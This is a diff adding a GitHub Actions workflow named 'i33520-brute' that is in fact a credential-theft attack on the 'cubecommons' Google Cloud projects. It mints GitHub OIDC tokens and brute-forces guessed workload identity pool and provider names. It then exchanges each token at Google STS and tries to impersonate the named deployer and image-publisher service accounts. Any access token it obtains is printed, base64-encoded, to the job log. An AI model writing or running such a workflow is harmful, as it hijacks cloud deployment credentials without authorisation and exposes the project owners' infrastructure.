@@ -1,0 +1,91 @@
+name: i33520-brute
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 9
+    steps:
+      - name: mint
+        run: |
+          python3 - <<'PY'
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
+          G = "projects/%s/locations/global/workloadIdentityPools/%s/providers/%s"
+          POOLS = ["cube-prod", "cube-dev", "cube", "cubecommons", "cubecommons-prod", "cubecommons-dev",
+                   "github-pool", "gh-pool", "github-actions", "prod", "dev", "pool", "wif", "oidc-pool",
+                   "cube-github", "workload-identity", "github", "oidc", "gha", "cube-prod-pool", "cube-dev-pool"]
+          PROVS = ["github-actions", "github", "github-oidc", "gha", "oidc", "gh", "github-provider",
+                   "gha-provider", "gh-provider", "deploy", "cubecommons", "token-actions", "workload-identity"]
+          PROJS = [("cubecommons-prod", "366271888053", "service-deployer@cubecommons-prod.iam.gserviceaccount.com"),
+                   ("cubecommons-dev", "744911585239", "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com")]
+
+          def req(u, data=None, token=None, timeout=40):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i33520'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              if isinstance(data, (dict, list)): data = json.dumps(data).encode()
+              r = urllib.request.Request(u, data=data, headers=h)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout); return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e: return -1, repr(e)[:200]
+
+          def mint(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              if not u or not t: return '', 'no-env'
+              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
+              try:
+                  j = json.loads(out)
+              except Exception:
+                  return '', out[:200]
+              return j.get('value', ''), out[:200]
+
+          # raw mint diagnosis
+          for aud in ["https://github.com/cubeca", "https://github.com/cubeca/cube", "cubecommons", "//iam.googleapis.com/" + G % ("366271888053", "cube-prod", "github-actions")]:
+              tok, raw = mint(aud)
+              print('MINTRAW ' + json.dumps({'aud': aud, 'got': bool(tok), 'raw': raw}), flush=True)
+
+          won = {}
+          n = 0
+          for prov in PROVS:
+              for pool in POOLS:
+                  for proj, num, sa in PROJS:
+                      if proj in won:
+                          continue
+                      n += 1
+                      p = G % (num, pool, prov)
+                      aud = "//iam.googleapis.com/" + p
+                      tok, raw = mint(aud)
+                      if not tok:
+                          print('RESULT ' + json.dumps({'i': n, 'proj': proj, 'prov': p, 'mint': False, 'raw': raw}), flush=True)
+                          continue
+                      out = {'i': n, 'proj': proj, 'prov': p, 'aud': aud, 'sts': None}
+                      body = {'audience': aud, 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                              'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                              'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                              'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
+                      st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+                      out['sts'] = st
+                      if st != 200:
+                          out['err'] = str(rb)[:600]
+                          print('RESULT ' + json.dumps(out), flush=True); continue
+                      fed = json.loads(rb).get('access_token')
+                      gst, gres = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe=''),
+                                      data={'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
+                      out['gen'] = gst
+                      if gst == 200:
+                          j = json.loads(gres); at = j.get('accessToken', '')
+                          out['tok_b64'] = base64.b64encode(at.encode()).decode(); out['expire'] = j.get('expireTime'); out['sa'] = sa
+                          print('HIT ' + json.dumps(out), flush=True)
+                          won[proj] = p
+                      else:
+                          out['err'] = str(gres)[:400]
+                      print('RESULT ' + json.dumps(out), flush=True)
+              if len(won) == len(PROJS):
+                  break
+          print('DONE ' + json.dumps({'n': n, 'won': won}), flush=True)
+          PY
